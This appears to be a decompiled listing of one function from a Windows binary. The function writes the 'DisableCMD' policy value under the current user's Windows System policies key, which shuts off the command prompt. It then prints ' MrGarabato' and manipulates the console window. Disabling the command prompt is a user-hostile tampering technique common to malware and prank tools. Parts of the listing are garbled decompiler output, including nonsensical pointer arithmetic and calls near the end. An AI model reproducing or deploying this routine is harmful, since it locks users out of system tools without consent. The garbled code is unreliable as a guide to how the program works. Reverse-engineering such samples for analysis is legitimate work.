/* RVA 0x12410  tam 10893 B  addr 0x140012410 */

void fcn.140012410(void)

{
    uint8_t *puVar1;
    code *pcVar2;
    uint8_t uVar3;
    int iVar4;
    ulong uVar5;
    int64_t iVar6;
    ulong uVar7;
    uchar *puVar8;
    uchar *puVar9;
    int32_t var_48h_2;
    int64_t var_78h;
    int64_t var_c0h;
    int64_t var_d0h;
    int64_t var_d8h;
    int64_t var_900h;
    uchar *puStack_a38;
    uchar auStack_a28 [24];
    uchar *puStack_a10;
    uint uStack_a08;
    uint uStack_a00;
    ulong uStack_9f8;
    uchar *puStack_9f0;
    ulong uStack_9e8;
    ulong uStack_9d0;
    uchar *puStack_998;
    ulong uStack_990;
    ulong uStack_988;
    uint64_t uStack_980;
    ulong uStack_978;
    uint uStack_970;
    uint auStack_8e0 [12];
    uchar auStack_8b0 [72];
    uchar *puStack_868;
    ulong uStack_860;
    ulong uStack_858;
    uint64_t uStack_850;
    int64_t var_70h;
    int64_t var_bp_60h;
    int64_t var_58h;
    int64_t var_50h;
    int32_t var_48h;
    uint64_t uStack_28;
    
    uStack_28 = *0x140020600 ^ &stack0xfffffffffffff5d8;
    uStack_970 = 0;
    puStack_868 = NULL;
    uStack_860 = 0;
    uStack_858 = 0;
    uStack_850 = 0;
    fcn.140001c90(&stack0xfffffffffffff798,L"SOFTWARE\\Policies\\Microsoft\\Windows\\System",0x2a);
    uStack_978 = 0;
    puVar8 = &stack0xfffffffffffff798;
    if (7 < uStack_850) {
        puVar8 = puStack_868;
    }
    uStack_9e8 = 0;
    puStack_9f0 = &stack0xfffffffffffff688;
    uStack_9f8 = 0;
    uStack_a00 = 0x2011f;
    uStack_a08 = 0;
    puVar9 = &stack0xfffffffffffff5d0;
    puStack_a38 = 0x1400124cc;
    iVar4 = fcn.14018cf70(0xffffffff80000001,puVar8,0,0);
    uVar5 = uStack_978;
    if (iVar4 == 0) {
        uStack_9d0 = uStack_978;
        puStack_998 = NULL;
        uStack_990 = 0;
        uStack_988 = 0;
        uStack_980 = 0;
        puStack_a38 = 0x140012501;
        fcn.140001c90(&stack0xfffffffffffff668,L"DisableCMD",10);
        auStack_8e0[0] = 0;
        puStack_a38 = &stack0xfffffffffffff668;
        if (7 < uStack_980) {
            puStack_a38 = puStack_998;
        }
        uStack_a08 = 4;
        puStack_a10 = &stack0xfffffffffffff720;
        puVar9 = &stack0xfffffffffffff5c8;
        iVar4 = fcn.140212a5b(uVar5,puStack_a38,0,4);
        if (iVar4 == 0) {
            if (7 < uStack_980) {
                if (0xfff < uStack_980 * 2 + 2) {
                    if (0x1f < puStack_998 + (-8 - *(puStack_998 + -8))) {
                        fcn.14018ffc9();
                        pcVar2 = swi(3);
                        (*pcVar2)();
                        return;
                    }
                }
                fcn.140015008();
            }
            fcn.14000e120();
            fcn.14003a4c4(" MrGarabato");
            uVar5 = fcn.1402771f8();
            iVar6 = fcn.1401bbfd1(0xfffffff5);
            fcn.14000cf40(iVar6,0x4b,0x18);
            uVar7 = fcn.1406a4efe(uVar5,0);
            fcn.140175171(uVar7,0xf030,0);
            uVar5 = fcn.1401cf4a0(uVar5,0);
            iVar6 = fcn.1402446b6(uVar5,0xf020,0);
            puVar1 = iVar6 + -0x75;
            uVar3 = uVar5 & 7;
            *puVar1 = *puVar1 >> uVar3 | *puVar1 << 8 - uVar3;
            return;
        }
        fcn.14000b520(&stack0xfffffffffffff750,iVar4,"Cannot write DWORD value: RegSetValueExW failed.");
        iVar4 = fcn.140015ea6(&stack0xfffffffffffff750,0x14001d4d0);
    }
    *(puVar9 + -8) = 0x140014e8c;
    fcn.14000b520(&stack0xfffffffffffff750,iVar4,"RegCreateKeyExW failed.");
    *(puVar9 + -8) = 0x140014e9c;
    fcn.140015ea6(&stack0xfffffffffffff750,0x14001d4d0);
    pcVar2 = swi(3);
    (*pcVar2)();
    return;
}
